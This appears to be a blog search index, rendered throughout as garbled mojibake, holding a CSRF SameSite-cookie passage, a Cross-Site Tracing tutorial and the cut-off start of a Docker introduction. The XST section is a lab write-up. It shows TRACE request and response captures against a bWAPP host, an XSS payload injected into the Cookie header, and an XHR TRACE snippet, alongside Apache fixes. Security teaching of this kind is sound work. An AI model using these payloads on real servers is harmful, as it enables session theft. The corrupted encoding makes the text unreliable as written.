æ”¾å®½äº†ç‚¹é™åˆ¶ï¼šå‡å¦‚è¿™ä¸ªè¯·æ±‚æ˜¯è¿™ç§è¯·æ±‚ï¼ˆæ”¹å˜äº†å½“å‰é¡µé¢æˆ–è€…æ‰“å¼€äº†æ–°é¡µé¢ï¼‰ä¸”åŒæ—¶æ˜¯ä¸ªGETè¯·æ±‚ï¼Œåˆ™è¿™ä¸ªCookieå¯ä»¥ä½œä¸ºç¬¬ä¸‰æ–¹Cookieã€‚æ¯”å¦‚è¯´ b.comè®¾ç½®äº†å¦‚ä¸‹Cookieï¼š Set-Cookie: foo=1; Samesite=Strict Set-Cookie: bar=2; Samesite=Lax Set-Cookie: baz=3 å½“ç”¨æˆ·ä» a.com ç‚¹å‡»é“¾æ¥è¿›å…¥ b.com æ—¶ï¼Œfoo è¿™ä¸ª Cookie ä¸ä¼šè¢«åŒ…å«åœ¨ Cookie è¯·æ±‚å¤´ä¸­ï¼Œä½† bar å’Œ baz ä¼šï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨æˆ·åœ¨ä¸åŒç½‘ç«™ä¹‹é—´é€šè¿‡é“¾æ¥è·³è½¬æ˜¯ä¸å—å½±å“äº†ã€‚ä½†å‡å¦‚è¿™ä¸ªè¯·æ±‚æ˜¯ä» a.com å‘èµ·çš„å¯¹ b.com çš„å¼‚æ­¥è¯·æ±‚ï¼Œæˆ–è€…é¡µé¢è·³è½¬æ˜¯é€šè¿‡è¡¨å•çš„ post æäº¤è§¦å‘çš„ï¼Œåˆ™barä¹Ÿä¸ä¼šå‘é€ã€‚ ç”ŸæˆTokenæ”¾åˆ°Cookieä¸­å¹¶ä¸”è®¾ç½®Cookieçš„Samesiteï¼ŒJavaä»£ç å¦‚ä¸‹ï¼š private void addTokenCookieAndHeader(HttpServletRequest httpRequest, HttpServletResponse httpResponse) { //ç”Ÿæˆtoken String sToken = this.generateToken(); //æ‰‹åŠ¨æ·»åŠ Cookieå®ç°æ”¯æŒâ€œSamesite=strictâ€ //Cookieæ·»åŠ åŒé‡éªŒè¯ String CookieSpec = String.format(\"%s=%s; Path=%s; HttpOnly; Samesite=Strict\", this.determineCookieName(httpRequest), sToken, httpRequest.getRequestURI()); httpResponse.addHeader(\"Set-Cookie\", CookieSpec); httpResponse.setHeader(CSRF_TOKEN_NAME, token); } ä»£ç æºè‡ªOWASP Cross-Site_Request_Forgery #Implementation example å¦‚ä½•ä½¿ç”¨SamesiteCookie å¦‚æœSamesiteCookieè¢«è®¾ç½®ä¸ºStrictï¼Œæµè§ˆå™¨åœ¨ä»»ä½•è·¨åŸŸè¯·æ±‚ä¸­éƒ½ä¸ä¼šæºå¸¦Cookieï¼Œæ–°æ ‡ç­¾é‡æ–°æ‰“å¼€ä¹Ÿä¸æºå¸¦ï¼Œæ‰€ä»¥è¯´CSRFæ”»å‡»åŸºæœ¬æ²¡æœ‰æœºä¼šã€‚ ä½†æ˜¯è·³è½¬å­åŸŸåæˆ–è€…æ˜¯æ–°æ ‡ç­¾é‡æ–°æ‰“å¼€åˆšç™»é™†çš„ç½‘ç«™ï¼Œä¹‹å‰çš„Cookieéƒ½ä¸ä¼šå­˜åœ¨ã€‚å°¤å…¶æ˜¯æœ‰ç™»å½•çš„ç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ–°æ‰“å¼€ä¸€ä¸ªæ ‡ç­¾è¿›å…¥ï¼Œæˆ–è€…è·³è½¬åˆ°å­åŸŸåçš„ç½‘ç«™ï¼Œéƒ½éœ€è¦é‡æ–°ç™»å½•ã€‚å¯¹äºç”¨æˆ·æ¥è®²ï¼Œå¯èƒ½ä½“éªŒä¸ä¼šå¾ˆå¥½ã€‚ å¦‚æœSamesiteCookieè¢«è®¾ç½®ä¸ºLaxï¼Œé‚£ä¹ˆå…¶ä»–ç½‘ç«™é€šè¿‡é¡µé¢è·³è½¬è¿‡æ¥çš„æ—¶å€™å¯ä»¥ä½¿ç”¨Cookieï¼Œå¯ä»¥ä¿éšœå¤–åŸŸè¿æ¥æ‰“å¼€é¡µé¢æ—¶ç”¨æˆ·çš„ç™»å½•çŠ¶æ€ã€‚ä½†ç›¸åº”çš„ï¼Œå…¶å®‰å…¨æ€§ä¹Ÿæ¯”è¾ƒä½ã€‚ å¦å¤–ä¸€ä¸ªé—®é¢˜æ˜¯Samesiteçš„å…¼å®¹æ€§ä¸æ˜¯å¾ˆå¥½ï¼Œç°é˜¶æ®µé™¤äº†ä»æ–°ç‰ˆChromeå’ŒFirefoxæ”¯æŒä»¥å¤–ï¼ŒSafariä»¥åŠiOS Safariéƒ½è¿˜ä¸æ”¯æŒï¼Œç°é˜¶æ®µçœ‹æ¥æš‚æ—¶è¿˜ä¸èƒ½æ™®åŠã€‚ è€Œä¸”ï¼ŒSamesiteCookieç›®å‰æœ‰ä¸€ä¸ªè‡´å‘½çš„ç¼ºé™·ï¼šä¸æ”¯æŒå­åŸŸã€‚ä¾‹å¦‚ï¼Œç§åœ¨topic.a.comä¸‹çš„Cookieï¼Œå¹¶ä¸èƒ½ä½¿ç”¨a.comä¸‹ç§æ¤çš„SamesiteCookieã€‚è¿™å°±å¯¼è‡´äº†å½“æˆ‘ä»¬ç½‘ç«™æœ‰å¤šä¸ªå­åŸŸåæ—¶ï¼Œä¸èƒ½ä½¿ç”¨SamesiteCookieåœ¨ä¸»åŸŸåå­˜å‚¨ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€‚æ¯ä¸ªå­åŸŸåéƒ½éœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•ä¸€æ¬¡ã€‚ æ€»ä¹‹ï¼ŒSamesiteCookieæ˜¯ä¸€ä¸ªå¯èƒ½æ›¿ä»£åŒæºéªŒè¯çš„æ–¹æ¡ˆï¼Œä½†ç›®å‰è¿˜å¹¶ä¸æˆç†Ÿï¼Œå…¶åº”ç”¨åœºæ™¯æœ‰å¾…è§‚æœ›ã€‚","categories":["å¸¸è§topæ¼æ´"]},{"title":"æµ…è°ˆCSTæ”»å‡»","path":"/2023/08/06/qian-tan-cst-gong-ji/","content":"å…¨ç§°Cross-Site-Tracing\"ç®€ç§°ä¸º CST / XST - è·¨ç«™å¼è¿½è¸ªæ”»å‡» å…ˆç®€è¿°ç›¸å…³æ¦‚å¿µ 0x01 XSSä¸httponly â€‹ æ­£å¸¸æƒ…å†µä¸‹ï¼Œå®¢æˆ·ç«¯è„šæœ¬ï¼ˆå¦‚JSè„šæœ¬ï¼‰æ˜¯å¯ä»¥é€šè¿‡document.cookieå‡½æ•°è·å¾—cookieä¿¡æ¯ï¼Œè¿™æ ·å¦‚æœæœ‰XSSè·¨ç«™æ¼æ´ï¼Œcookieå¾ˆå®¹æ˜“è¢«ç›—å–ã€‚æµè§ˆå™¨æœ‰ä¸€ä¸ªå®‰å…¨ç­–ç•¥ï¼Œé€šè¿‡è®¾ç½®cookieçš„httponlyå±æ€§ï¼Œè¿™æ ·å®¢æˆ·ç«¯è„šæœ¬å°±ä¸èƒ½é€šè¿‡document.cookieè®¿é—®è¯¥cookieï¼Œå³ä½¿æœ‰XSSæ¼æ´ï¼Œä¹Ÿä¸èƒ½ç›—å–ç”¨æˆ·cookieã€‚è¿™ä¸ªæ—¶å€™å°±å¯ä»¥åˆ©ç”¨HTTP TRACEæ–¹æ³•æ¥è·å–åˆ°ç”¨æˆ·çš„cookieä¿¡æ¯ã€‚ 0x02 ä»€ä¹ˆæ˜¯httponly å¦‚æœcookieä¸­è®¾ç½®äº†HttpOnlyå±æ€§ï¼Œé‚£ä¹ˆé€šè¿‡jsè„šæœ¬å°†æ— æ³•è¯»å–åˆ°cookieä¿¡æ¯ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆçš„é˜²æ­¢XSSæ”»å‡»çªƒå–cookieå†…å®¹ å¦‚ä½•å¼€å¯ PHP5.2ä»¥ä¸Šç‰ˆæœ¬å·²æ”¯æŒHttpOnlyå‚æ•°çš„è®¾ç½® åŒæ ·ä¹Ÿæ”¯æŒå…¨å±€çš„HttpOnlyçš„è®¾ç½®ï¼Œ åœ¨php.iniä¸­è®¾ç½® session.cookie_httponly = 1 å°†å¼€å¯å…¨å±€çš„Cookieçš„HttpOnlyå±æ€§ã€‚ ä¹Ÿå¯ä»¥é€šè¿‡ä»£ç æ¥å®ç° &lt;?php ini_set(\"session.cookie_httponly\", 1); //æˆ– session_set_cookie_params(0, NULL, NULL, NULL, TRUE); ?&gt; 0x03 ä»€ä¹ˆæ˜¯TRACEæ–¹æ³• â€‹ TRACEä½œç”¨ï¼šå®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œè¿™ä¸ªè¯·æ±‚å¯èƒ½è¦ç©¿è¿‡é˜²ç«å¢™ã€ä»£ç†ã€ç½‘å…³æˆ–å…¶ä»–ä¸€äº›åº”ç”¨ç¨‹åºã€‚æ¯ä¸ªä¸­é—´èŠ‚ç‚¹éƒ½å¯èƒ½ä¼šä¿®æ”¹åŸå§‹çš„ HTTP è¯·æ±‚ã€‚TRACE æ–¹æ³•å…è®¸å®¢æˆ·ç«¯åœ¨ æœ€ç»ˆå°†è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨æ—¶ï¼Œçœ‹çœ‹å®ƒå˜æˆäº†ä»€ä¹ˆæ ·å­ã€‚ â€‹ TRACE è¯·æ±‚ä¼šåœ¨ç›®çš„æœåŠ¡å™¨ç«¯å‘èµ·ä¸€ä¸ª ç¯å› è¯Šæ–­ã€‚è¡Œç¨‹æœ€åä¸€ç«™çš„æœåŠ¡å™¨ä¼šå¼¹å›ä¸€æ¡ TRACE å“åº”ï¼Œå¹¶åœ¨å“åº”ä¸»ä½“ä¸­æºå¸¦å®ƒæ”¶åˆ°çš„åŸå§‹è¯·æ±‚æŠ¥æ–‡ã€‚è¿™æ ·å®¢æˆ·ç«¯å°±å¯ä»¥æŸ¥çœ‹åœ¨æ‰€æœ‰ä¸­é—´ HTTP åº”ç”¨ç¨‹åºç»„æˆçš„è¯·æ±‚ / å“åº”é“¾ä¸Šï¼ŒåŸå§‹æŠ¥æ–‡æ˜¯å¦ï¼Œä»¥åŠå¦‚ä½•è¢«æ¯åæˆ–ä¿®æ”¹è¿‡ã€‚ 0x04 TRACEå·¥ä½œæ–¹æ³• ä¸‹é¢å°±æ¥çœ‹ä¸‹å…è®¸TRACEæ–¹æ³•çš„æœåŠ¡å™¨ï¼ŒTRACEæ–¹æ³•æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ è¯·æ±‚åŒ…: TRACE http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1 Host: 10.20.40.95 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Referer: http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;lastname=aa&amp;form=submit Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: UM_distinctid=16d6147443356c-0f39aedf637785-67e1b3f-144000-16d61474434806; CNZZDATA1261218610=72836639-1569293821-%7C1569293821; PHPSESSID=jo1tq7ivnljqoknds138igko97; security_level=2 å“åº”åŒ…ï¼š HTTP/1.1 200 OK Date: Fri, 29 Nov 2019 11:32:59 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html Content-Length: 819 TRACE /bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1 Host: 10.20.40.95 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Referer: http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;lastname=aa&amp;form=submit Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: UM_distinctid=16d6147443356c-0f39aedf637785-67e1b3f-144000-16d61474434806; CNZZDATA1261218610=72836639-1569293821-%7C1569293821; PHPSESSID=jo1tq7ivnljqoknds138igko97; security_level=2 å¯ä»¥çœ‹åˆ°å“åº”åŒ… å“åº”ä½“ä¸­æ˜¯åŸå§‹è¯·æ±‚æŠ¥æ–‡ï¼Œå¹¶ä¸”ä¼šä¸‹è½½ä¸€ä¸ªphpæ ¼å¼çš„æ–‡ä»¶ï¼Œæ‰“å¼€æ–‡ä»¶å†…å®¹æ˜¯åŸå§‹è¯·æ±‚æŠ¥æ–‡ã€‚ 0x05 æ¼æ´æ¦‚è¿° â€‹ å½“æœåŠ¡å™¨å…è®¸traceæ–¹æ³•æ—¶ï¼Œå°±å¯èƒ½å­˜åœ¨è·¨ç«™è·Ÿè¸ªæ”»å‡»ã€‚è·¨ç«™è·Ÿè¸ªæ”»å‡»å³CSTæ”»å‡»ï¼Œæ˜¯ä¸€ç§åˆ©ç”¨XSSå’ŒHTTP TRACEåŠŸèƒ½æ¥è¿›è¡Œæ”»å‡»çš„æ–¹å¼ã€‚ â€‹ æ”»å‡»è€…å¯ä»¥åœ¨TRACEè¯·æ±‚çš„å“åº”ä¸­æ’å…¥æ¶æ„è„šæœ¬æˆ–è€…ä»£ç ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å“åº”ä¸­æ’å…¥JavaScriptä»£ç æ¥æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSæ”»å‡»ï¼‰ï¼Œæˆ–è€…åœ¨å“åº”ä¸­æ’å…¥é‡å®šå‘ä»£ç æ¥å°†å—å®³è€…é‡å®šå‘åˆ°æ¶æ„ç«™ç‚¹ï¼Œå½“å—å®³è€…æµè§ˆç½‘ç«™æ—¶ï¼Œæ¶æ„è„šæœ¬æˆ–è€…ä»£ç ä¼šè¢«æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ¶æ„è„šæœ¬æˆ–è€…ä»£ç æ¥è·å–å—å®³è€…çš„æ•æ„Ÿä¿¡æ¯ã€æ‰§è¡Œæ¶æ„æ“ä½œç­‰ï¼Œå¯¼è‡´cookieæ¬ºéª—æˆ–è€…æ˜¯ä¸­é—´äººæ”»å‡»ã€‚ æ”»å‡»è€…å‘å—å®³è€…å‘é€ä¸€æ¡åŒ…å«TRACEè¯·æ±‚çš„é“¾æ¥æˆ–è€…è„šæœ¬ã€‚TRACEè¯·æ±‚é€šå¸¸ç”¨äºè°ƒè¯•å’Œæµ‹è¯•WebæœåŠ¡å™¨ï¼Œå¯ä»¥å°†HTTPè¯·æ±‚å’Œå“åº”å›æ˜¾ç»™å®¢æˆ·ç«¯ã€‚ å½“å—å®³è€…ç‚¹å‡»é“¾æ¥æˆ–è€…è¿è¡Œè„šæœ¬æ—¶ï¼ŒTRACEè¯·æ±‚å°†è¢«å‘é€åˆ°ç›®æ ‡WebæœåŠ¡å™¨ã€‚ç”±äºTRACEè¯·æ±‚ä¼šå°†HTTPè¯·æ±‚å’Œå“åº”å›æ˜¾ç»™å®¢æˆ·ç«¯(ä¾æ—§æ˜¯å“åº”é¡µé¢çš„bpä¸­,æˆ‘ä»¬åœ¨httpå¤´ä¸­æ’å…¥å“åº”jsè„šæœ¬æ¥æ”»å‡»)ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨å“åº”ä¸­æ’å…¥æ¶æ„è„šæœ¬æˆ–è€…ä»£ç ã€‚ HTTP/1.1 200 OK Content-Type: text/html &lt;html&gt; &lt;head&gt; &lt;script&gt; alert('ä½ çš„è´¦å·å·²è¢«æ”»å‡»'); // ... è¿›è¡Œå…¶ä»–æ¶æ„æ“ä½œ &lt;/script&gt; &lt;/head&gt; &lt;body&gt; æ­£å¸¸çš„å“åº”å†…å®¹ &lt;/body&gt; &lt;/html&gt; æ£€æµ‹æ¡ä»¶ï¼š éœ€è¦ç›®æ ‡ Web æœåŠ¡å™¨å…è®¸æ¥å— Traceã€Track æ–¹æ³•çš„è¯·æ±‚* å®¢æˆ·ç«¯å¯ä»¥å‘é€ Traceã€Track æ–¹æ³•çš„è¯·æ±‚ã€‚ï¼ˆå¦‚ä»Šæµè§ˆå™¨ç¯å¢ƒä¸‹å·²ç»æœç»è¿™ç§è¯·æ±‚ï¼‰ 0x06 æ¼æ´éªŒè¯ ä¸€ã€é¦–å…ˆé€šè¿‡æŠ“åŒ…å·¥å…·æ‹¦æˆªè¯·æ±‚ï¼Œä¿®æ”¹è¯·æ±‚åŒ…ä¸­çš„è¯·æ±‚æ–¹æ³•å’Œè¯·æ±‚åŒ…ä¸­çš„ä»»æ„ä¸€ä¸ªå­—æ®µï¼Œä¸‹é¢ä»¥Cookieå­—æ®µä¸ºä¾‹ï¼Œåœ¨Cookieä¸­æ’å…¥XSSä»£ç ï¼š TRACE http://10.20.40.95/bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1 Host: 10.20.40.95 Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: &lt;script&gt;alert(\"TRACE XSS\")&lt;/script&gt; äºŒã€ä¿®æ”¹å“åº”åŒ…ä¸­çš„Content-Type:message/httpï¼Œæ”¹ä¸ºContent-Type:text/htmlï¼š HTTP/1.1 200 OK Date: Fri, 29 Nov 2019 11:50:49 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html Content-Length: 570 TRACE /bWAPP/bWAPP/xss_get.php?firstname=aaaa&amp;lastname=aaa&amp;form=submit HTTP/1.1 Host: 10.20.40.95 Connection: keep-alive Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: &lt;script&gt;alert(\"TRACE XSS\")&lt;/script&gt; å‘é€è¯·æ±‚åé¡µé¢å°±ä¼šå¼¹çª—äº†ã€‚ 0x07 ä¿®å¤å»ºè®® ApacheæœåŠ¡å™¨ï¼š è™šæ‹Ÿä¸»æœºå¯ä»¥åœ¨.htaccessæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç è¿‡æ»¤TRACEè¯·æ±‚: RewriteEngine on RewriteCond %{REQUEST_METHOD} ^(TRACE|TRACK) RewriteRule .* - [F] æœåŠ¡å™¨ç”¨æˆ·åœ¨httpd.confå°¾éƒ¨æ·»åŠ å¦‚ä¸‹æŒ‡ä»¤åï¼Œé‡å¯apacheå³å¯: TraceEnable off Web æœåŠ¡å™¨é™åˆ¶ Traceã€Track æ–¹æ³•çš„è¯·æ±‚å³å¯ã€‚ å¦å¦‚ä»Šï¼Œ XMLHTTPRequest å·²ç»æœç»äº† Trace ä¸ Track æ–¹æ³•çš„è¯·æ±‚ï¼ˆChrome 25 ç‰ˆæœ¬åŠ FireFox 19 ä¹‹åï¼‰ï¼Œå¦‚æœå°è¯•ç”¨ Trace / Track æ–¹æ³•è¯·æ±‚ï¼Œä¼šæŠ›å‡º SecurityError å¼‚å¸¸ï¼Œè¿™ä¹Ÿä»æ ¹æœ¬ä¸Šæœç»äº† XST æ”»å‡»ã€‚ var xhr = new XMLHttpRequest(); xhr.open('TRACE', 'http://localhost:3000/', false); xhr.send(null); if(200 == xhr.status) console.log(xhr.responseText); 0x08 å…¶ä»–è¡¥å……ï¼š CSTä¸XSSçš„æ¯”è¾ƒ: ç›¸åŒç‚¹ï¼šéƒ½å…·æœ‰å¾ˆå¤§çš„æ¬ºéª—æ€§ï¼Œå¯ä»¥å¯¹å—å®³ä¸»æœºäº§ç”Ÿå±å®³ï¼Œè€Œä¸”è¿™ç§æ”»å‡»æ˜¯å¤šå¹³å°å¤šæŠ€æœ¯çš„ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨Activeæ§ä»¶ã€Flashã€Javaç­‰æ¥è¿›è¡ŒCSTå’ŒXSSæ”»å‡»ã€‚ CSTä¼˜ç‚¹ï¼šå¯ä»¥ç»•è¿‡ä¸€èˆ¬çš„httpéªŒè¯ä»¥åŠNTLMéªŒè¯","categories":["å¸¸è§æ”»å‡»æ–¹æ³•"]},{"title":"dockeråŸºç¡€","path":"/2023/08/06/docker-jian-jie/","content":"1 Dockerè¯¦è§£ 1.1 æ˜¯ä»€ä¹ˆï¼Ÿ 1.1.1 é—®é¢˜ï¼šä¸ºä»€ä¹ˆä¼šæœ‰dockerå‡ºç°ï¼Ÿ å‡å®šæ‚¨åœ¨å¼€å‘ä¸€ä¸ªå°šç¡…è°·çš„è°·ç²’å•†åŸï¼Œæ‚¨ä½¿ç”¨çš„æ˜¯ä¸€å°ç¬”è®°æœ¬ç”µè„‘è€Œä¸”æ‚¨çš„å¼€å‘ç¯å¢ƒå…·æœ‰ç‰¹å®šçš„é…ç½®ã€‚å…¶ä»–å¼€å‘äººå‘˜èº«å¤„çš„ç¯å¢ƒé…ç½®ä¹Ÿå„æœ‰ä¸åŒã€‚æ‚¨æ­£åœ¨å¼€å‘çš„åº”ç”¨ä¾èµ–äºæ‚¨å½“å‰çš„é…ç½®ä¸”è¿˜è¦ä¾èµ–äºæŸäº›é…ç½®æ–‡ä»¶ã€‚æ­¤å¤–ï¼Œæ‚¨çš„ä¼ä¸šè¿˜æ‹¥æœ‰æ ‡å‡†åŒ–çš„æµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒï¼Œä¸”å…·æœ‰è‡ªèº«çš„é…ç½®å’Œä¸€ç³»åˆ—æ”¯æŒæ–‡ä»¶ã€‚æ‚¨å¸Œæœ›å°½å¯èƒ½å¤šåœ¨æœ¬åœ°æ¨¡æ‹Ÿè¿™äº›ç¯å¢ƒè€Œä¸äº§ç”Ÿé‡æ–°åˆ›å»ºæœåŠ¡å™¨ç¯å¢ƒçš„å¼€é”€ã€‚è¯·é—®ï¼Ÿ æ‚¨è¦å¦‚ä½•ç¡®ä¿åº”ç”¨èƒ½å¤Ÿåœ¨è¿™äº›ç¯å¢ƒä¸­è¿è¡Œå’Œé€šè¿‡è´¨é‡æ£€æµ‹ï¼Ÿå¹¶ä¸”åœ¨éƒ¨ç½²è¿‡ç¨‹ä¸­ä¸å‡ºç°ä»¤äººå¤´ç–¼çš„ç‰ˆæœ¬ã€é…ç½®é—®é¢˜ï¼Œä¹Ÿæ— éœ€é‡æ–°ç¼–å†™ä»£ç å’Œè¿›è¡Œæ•…éšœä¿®å¤ï¼Ÿ ç­”æ¡ˆå°±æ˜¯ä½¿ç”¨å®¹å™¨ã€‚Dockerä¹‹æ‰€ä»¥å‘å±•å¦‚æ­¤è¿…é€Ÿï¼Œä¹Ÿæ˜¯å› ä¸ºå®ƒå¯¹æ­¤ç»™å‡ºäº†ä¸€ä¸ªæ ‡å‡†åŒ–çš„è§£å†³æ–¹æ¡ˆ-----ç³»ç»Ÿå¹³æ»‘ç§»æ¤ï¼Œå®¹å™¨è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚ ç¯å¢ƒé…ç½®ç›¸å½“éº»çƒ¦ï¼Œæ¢ä¸€å°æœºå™¨ï¼Œå°±è¦é‡æ¥ä¸€æ¬¡ï¼Œè´¹åŠ›è´¹æ—¶ã€‚å¾ˆå¤šäººæƒ³åˆ°ï¼Œèƒ½ä¸èƒ½ä»æ ¹æœ¬ä¸Šè§£å†³é—®é¢˜ï¼Œè½¯ä»¶å¯ä»¥å¸¦ç¯å¢ƒå®‰è£…ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œå®‰è£…çš„æ—¶å€™ï¼ŒæŠŠåŸå§‹ç¯å¢ƒä¸€æ¨¡ä¸€æ ·åœ°å¤åˆ¶è¿‡æ¥ã€‚å¼€å‘äººå‘˜åˆ©ç”¨ Docker å¯ä»¥æ¶ˆé™¤åä½œç¼–ç æ—¶â€œåœ¨æˆ‘çš„æœºå™¨ä¸Šå¯æ­£å¸¸å·¥ä½œâ€çš„é—®é¢˜ã€‚ ä¹‹å‰åœ¨æœåŠ¡å™¨é…ç½®ä¸€ä¸ªåº”ç”¨çš„è¿è¡Œç¯å¢ƒï¼Œè¦å®‰è£…å„ç§è½¯ä»¶ï¼Œå°±æ‹¿å°šç¡…è°·ç”µå•†é¡¹ç›®çš„ç¯å¢ƒæ¥è¯´ï¼ŒJava/RabbitMQ/MySQL/JDBCé©±åŠ¨åŒ…ç­‰ã€‚å®‰è£…å’Œé…ç½®è¿™äº›ä¸œè¥¿æœ‰å¤šéº»çƒ¦å°±ä¸è¯´äº†ï¼Œå®ƒè¿˜ä¸èƒ½è·¨å¹³å°ã€‚å‡å¦‚æˆ‘ä»¬æ˜¯åœ¨ Windows ä¸Šå®‰è£…çš„è¿™äº›ç¯å¢ƒï¼Œåˆ°äº† Linux åˆå¾—é‡æ–°è£…ã€‚å†µä¸”å°±ç®—ä¸è·¨æ“ä½œç³»ç»Ÿï¼Œæ¢å¦ä¸€å°åŒæ ·æ“ä½œç³»ç»Ÿçš„æœåŠ¡å™¨ï¼Œè¦ç§»æ¤åº”ç”¨ä¹Ÿæ˜¯éå¸¸éº»çƒ¦çš„ã€‚ ä¼ ç»Ÿä¸Šè®¤ä¸ºï¼Œè½¯ä»¶ç¼–ç å¼€å‘/æµ‹è¯•ç»“æŸåï¼Œæ‰€äº§å‡ºçš„æˆæœå³æ˜¯ç¨‹åºæˆ–æ˜¯èƒ½å¤Ÿç¼–è¯‘æ‰§è¡Œçš„äºŒè¿›åˆ¶å­—èŠ‚ç ç­‰(javaä¸ºä¾‹)ã€‚è€Œä¸ºäº†è®©è¿™äº›ç¨‹åºå¯ä»¥é¡ºåˆ©æ‰§è¡Œï¼Œå¼€å‘å›¢é˜Ÿä¹Ÿå¾—å‡†å¤‡å®Œæ•´çš„éƒ¨ç½²æ–‡ä»¶ï¼Œè®©ç»´è¿å›¢é˜Ÿå¾—ä»¥éƒ¨ç½²åº”ç”¨ç¨‹å¼ï¼Œå¼€å‘éœ€è¦æ¸…æ¥šçš„å‘Šè¯‰è¿ç»´éƒ¨ç½²å›¢é˜Ÿï¼Œç”¨çš„å…¨éƒ¨é…ç½®æ–‡ä»¶+æ‰€æœ‰è½¯ä»¶ç¯å¢ƒã€‚ä¸è¿‡ï¼Œå³ä¾¿å¦‚æ­¤ï¼Œä»ç„¶å¸¸å¸¸å‘ç”Ÿéƒ¨ç½²å¤±è´¥çš„çŠ¶å†µã€‚Dockerçš„å‡ºç°ä½¿å¾—Dockerå¾—ä»¥æ‰“ç ´è¿‡å»ã€Œç¨‹åºå³åº”ç”¨ã€çš„è§‚å¿µã€‚é€è¿‡é•œåƒ(images)å°†ä½œä¸šç³»ç»Ÿæ ¸å¿ƒé™¤å¤–ï¼Œè¿ä½œåº”ç”¨ç¨‹å¼æ‰€éœ€è¦çš„ç³»ç»Ÿç¯å¢ƒï¼Œç”±ä¸‹è€Œä¸Šæ‰“åŒ…ï¼Œè¾¾åˆ°åº”ç”¨ç¨‹å¼è·¨å¹³å°é—´çš„æ— ç¼æ¥è½¨è¿ä½œã€‚ 1.1.2 Dockerç†å¿µ Dockeræ˜¯åŸºäºGoè¯­è¨€å®ç°çš„äº‘å¼€æºé¡¹ç›®ã€‚ Dockerçš„ä¸»è¦ç›®æ ‡æ˜¯â€œBuildï¼ŒShip and Run Any App,Anywhereâ€ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡å¯¹åº”ç”¨ç»„ä»¶çš„å°è£…ã€åˆ†å‘ã€éƒ¨ç½²ã€è¿è¡Œç­‰ç”Ÿå‘½å‘¨æœŸçš„ç®¡ç†ï¼Œä½¿ç”¨æˆ·çš„APPï¼ˆå¯ä»¥æ˜¯ä¸€ä¸ªWEBåº”ç”¨æˆ–æ•°æ®åº“åº”ç”¨ç­‰ç­‰ï¼‰åŠå…¶è¿è¡Œç¯å¢ƒèƒ½å¤Ÿåšåˆ°â€œä¸€æ¬¡é•œåƒï¼Œå¤„å¤„è¿è¡Œâ€ã€‚ Linuxå®¹å™¨æŠ€æœ¯çš„å‡ºç°å°±è§£å†³äº†è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œè€Œ Docker 